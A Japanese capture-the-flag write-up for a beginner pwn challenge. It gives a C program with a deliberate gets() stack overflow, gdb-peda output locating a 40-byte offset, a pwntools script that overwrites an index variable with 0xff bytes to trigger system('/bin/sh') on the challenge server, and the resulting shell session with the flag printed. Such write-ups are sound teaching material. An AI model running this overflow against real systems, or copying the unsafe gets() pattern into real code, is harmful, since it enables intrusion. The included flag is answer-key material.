# Writeup

以下のプログラムが与えられる。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


const char *inspirational_messages[] = {
  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
};

int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  char heartfelt_message[32];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(inspirational_messages[inspirational_message_index]);
  puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
  puts("can you write me a heartfelt message to cheer me up? :(");

  gets(heartfelt_message);

  if(inspirational_message_index == -1) {
    system("/bin/sh");
  }
}
```

getsでバッファオーバーフローを起こし、`inspirational_message_index`変数を書き換えればよい。

gdb-pedaでoffsetを調べたところ、40であることが分かった。


```
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdde0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x4012c0 (<__libc_csu_init>:       endbr64)
RCX: 0x7ffff7faf980 --> 0xfbad208b
RDX: 0x0
RSI: 0x7ffff7fafa03 --> 0xfb24d0000000000a
RDI: 0x7ffff7fb24d0 --> 0x0
RBP: 0x7fffffffde10 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RSP: 0x7fffffffdde0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x4012a5 (<main+175>:      )
R8 : 0x7fffffffdde0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
R9 : 0x0
R10: 0x400513 --> 0x6172730073746567 ('gets')
R11: 0x246
R12: 0x401110 (<_start>:        endbr64)
R13: 0x7fffffffdf00 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401299 <main+163>: lea    rax,[rbp-0x30]
   0x40129d <main+167>: mov    rdi,rax
   0x4012a0 <main+170>: call   0x4010f0 <gets@plt>
=> 0x4012a5 <main+175>:
    cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x4012aa <main+180>: jne    0x4012b8 <main+194>
   0x4012ac <main+182>:
    lea    rdi,[rip+0xf35]        # 0x4021e8
   0x4012b3 <main+189>: call   0x4010c0 <system@plt>
   0x4012b8 <main+194>: mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdde0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdde8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffddf0 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffddf8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffde00 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffde08 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffde10 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0056| 0x7fffffffde18 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004012a5 in main ()
Value returned is $1 = 0x7fffffffdde0 "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$ xi $rbp-0x8
0x7fffffffde08 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
Virtual memory mapping:
Start : 0x00007ffffffde000
End   : 0x00007ffffffff000
Offset: 0x1fe08
Perm  : rw-p
Name  : [stack]
gdb-peda$ patto AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 40
```

`rbp-0x8`を`0xffffffffffffffff`にすればよいので、40 + 8 = 48 バイトの`\xff`を送信する。

```py
from pwn import *

io = remote('mc.ax', '31199')
io.sendline(b'\xff' * (40 + 8))
io.interactive()
```

```
$ python3 solver.py
"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪
𝘴 𝘸𝘦𝘦𝘬"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
$ ls
flag.txt
run
$ cat flag.txt
flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
[*] Got EOF while reading in interactive
$
```

<!-- flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me} -->